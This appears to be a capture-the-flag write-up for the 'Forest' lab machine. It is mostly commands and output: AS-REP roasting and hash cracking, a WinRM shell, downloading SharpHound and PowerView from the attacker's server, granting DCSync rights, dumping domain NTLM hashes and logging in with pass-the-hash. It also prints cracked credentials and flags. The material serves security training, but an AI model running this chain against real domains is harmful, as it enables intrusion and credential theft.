# Forest
```bash
ping 10.129.238.207 
PING 10.129.72.31 (10.129.72.31) 56(84) bytes of data.
64 bytes from 10.129.72.31: icmp_seq=1 ttl=127 time=69.5 ms
64 bytes from 10.129.72.31: icmp_seq=2 ttl=127 time=68.5 ms
64 bytes from 10.129.72.31: icmp_seq=3 ttl=127 time=68.5 ms
64 bytes from 10.129.72.31: icmp_seq=4 ttl=127 time=72.5 ms
64 bytes from 10.129.72.31: icmp_seq=5 ttl=127 time=68.7 ms
64 bytes from 10.129.72.31: icmp_seq=6 ttl=127 time=68.7 ms
64 bytes from 10.129.72.31: icmp_seq=7 ttl=127 time=72.8 ms
^C
--- 10.129.72.31 ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 6011ms
rtt min/avg/max/mdev = 68.519/69.898/72.789/1.772 ms
                                                                                           
nmap -sC -sV 10.129.238.207 -p-
Nmap scan report for 10.129.238.207
Host is up (0.14s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-14 08:18:04Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49699/tcp open  msrpc        Microsoft Windows RPC
53944/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-06-14T01:18:57-07:00
| smb2-time: 
|   date: 2024-06-14T08:18:58
|_  start_date: 2024-06-14T07:35:01

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 431.32 seconds

```
```bash
    rpcclient 10.129.238.207 -U%    
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
```bash
go to https://www.tarlogic.com/blog/how-to-attack-kerberos/ and download GetNPUsers.py
#create a list that contains users.
nano userlist1.txt                                                           

python3 GetNPUsers.py -dc-ip 10.129.238.207 htb.local/ -usersfile userlist1.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:97be8274c307b55a0f1c113edd389e65$705c60d543892a9210bd0bc7ff922736ce26ee3aebb3a81bf472ca1112b78764ba3c21c68737473c40916b6a2d208f930182a63bb91e01f3d41c04553e5ec47be79cce4fff39f9eac186739ebb2f00850b958def02d4e9a8b4992c5fb340a7ca33f5763afaac57366e0e546154ac817e2d35f0a9c626f59386251943998a3941d1b427445bfaa0d95e783b21d3fae45691b60635dcb8f8eec35f1e4c97d4865d5d89209d701f4a91208357ae002eef364e382f4a2a16a47b0670a0ed0ef110886f64bbf9f93138592283d182bb9a28b47c1b9f883da348e22a8dcdf7a258da10e962fdea888a
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set


nano finally.hash  #paste the hash inside                                                                                                                                          
john --wordlist=/usr/share/wordlists/rockyou.txt finally.hash                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:03 DONE (2024-06-14 03:54) 0.2617g/s 1069Kp/s 1069Kc/s 1069KC/s s3xirexi..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
```bash
#we can use evil-winrm because of port 5985.        
evil-winrm -i 10.129.238.207 -u svc-alfresco -p s3rvice 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                               
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> ls


    Directory: C:\Users\svc-alfresco


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/23/2019   2:16 PM                Desktop
d-r---        9/22/2019   4:02 PM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


cd*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/14/2024  12:35 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
03b630f5890a49c5d64e3b7f27bce745
```
```bash
download bloodhound
sudo apt install bloodhound
sudo neo4j console
bloodhound
Go to https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1
and Download  SharpHound-v1.1.1.zip and unzip it 
```
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> wget http://10.10.14.17:80/Downloads/SharpHound.exe -OutFile C:\Users\svc-alfresco\Desktop\SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/14/2024   4:18 AM        1052160 SharpHound.exe
-ar---        6/14/2024   4:13 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ./SharpHound.exe
2024-06-14T04:23:15.0363412-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-06-14T04:23:15.1613433-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-06-14T04:23:15.1925965-07:00|INFORMATION|Initializing SharpHound at 4:23 AM on 6/14/2024
2024-06-14T04:23:15.4738456-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-06-14T04:23:15.4894712-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-06-14T04:23:16.7238574-07:00|INFORMATION|Beginning LDAP search for htb.local
2024-06-14T04:23:17.0675975-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-06-14T04:23:17.0675975-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-06-14T04:23:46.8801557-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2024-06-14T04:24:04.9895705-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2024-06-14T04:24:05.5364420-07:00|INFORMATION|Consumers finished, closing output channel
2024-06-14T04:24:05.5833279-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-06-14T04:24:05.8958176-07:00|INFORMATION|Status: 162 objects finished (+162 3.306123)/s -- Using 48 MB RAM
2024-06-14T04:24:05.8958176-07:00|INFORMATION|Enumeration finished in 00:00:49.1792170
2024-06-14T04:24:06.0364497-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 117 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-06-14T04:24:06.0520745-07:00|INFORMATION|SharpHound Enumeration Completed at 4:24 AM on 6/14/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/14/2024   4:24 AM          18718 20240614042404_BloodHound.zip
-a----        6/14/2024   4:24 AM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        6/14/2024   4:18 AM        1052160 SharpHound.exe
-ar---        6/14/2024   4:13 AM             34 user.txt

C:\Users\svc-alfresco\Desktop> download C:\Users\svc-alfresco\Desktop\20240524064735_BloodHound.zip /home/user/Desktop/bloodhound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\20240524064735_BloodHound.zip to /home/user/Desktop/bloodhound.zip
                                        
Info: Download successful!
```
```bash
sudo neo4j console                
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2024-06-14 11:29:27.868+0000 INFO  Starting...
2024-06-14 11:29:28.114+0000 INFO  This instance is ServerId{aa095c25} (aa095c25-37cb-4783-9ebc-1e540c52f5fb)
2024-06-14 11:29:28.706+0000 INFO  ======== Neo4j 4.4.26 ========
2024-06-14 11:29:29.326+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2024-06-14 11:29:29.326+0000 INFO  Updating the initial password in component 'security-users'
2024-06-14 11:29:29.778+0000 INFO  Bolt enabled on localhost:7687.
2024-06-14 11:29:30.224+0000 INFO  Remote interface available at http://localhost:7474/
2024-06-14 11:29:30.228+0000 INFO  id: 7571FF76BB45697325601642C07576DF5AB6571CEAA85454D0B3CA5602D72687
2024-06-14 11:29:30.228+0000 INFO  name: system
2024-06-14 11:29:30.228+0000 INFO  creationDate: 2024-05-24T12:19:07.697Z
2024-06-14 11:29:30.228+0000 INFO  Started.
```
```bash
sudo bloodhound                   
#after running this command bloodhound will start and you will be able to see the active directory mapping. You need to move hellhounds.zip to hellhound application
after that open menu with 3 stripes symbol and click Analysis. After that go all the way down and click Find Shortest Paths to Domain Admins. Now you will be able to
see the active directory mapping.
<img width="1493" alt="image" src="https://github.com/BoraYigitGulec/hackthebox/assets/114056361/7350b39d-40bf-4376-9f8f-f3392c9e2789">
you can click use the src link to see my screen.
After this right click to WriteDacl and click to help. Then click to Windows Abuse to see how we can abuse it

```
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user b33 password123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
b33                      byra                     DefaultAccount
Guest                    HealthMailbox0659cc1     HealthMailbox670628e
HealthMailbox6ded678     HealthMailbox7108a4e     HealthMailbox83d6781
HealthMailbox968e74d     HealthMailboxb01ac64     HealthMailboxc0a90c9
HealthMailboxc3d7722     HealthMailboxfc9daad     HealthMailboxfd87238
krbtgt                   lucinda                  mark
santi                    sebastien                SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb     SM_2c8eef0a09b545acb     SM_681f53d4942840e18
SM_75a538d3025e4db9a     SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b     SM_ca8c2ed5bdab4dc9b     svc-alfresco
tonee
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add b33  
The command completed successfully.
#Download PowerView.ps1 from https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> wget http://10.10.14.17:80/Downloads/PowerView.ps1 -OutFile C:\Users\svc-alfresco\Documents\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/14/2024   7:02 AM                WindowsPowerShell
-a----        6/14/2024   7:52 AM         770279 PowerView.ps1

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . ./PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb\b33', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity b33 -Rights DCSync
```
```bash
$ impacket-secretsdump   htb.local/b33:password123@10.129.238.207
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


```
```bash
$ evil-winrm -i 10.129.238.207 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/14/2024   4:13 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d824eef15379d5e51c23101c0dc3a10f

```
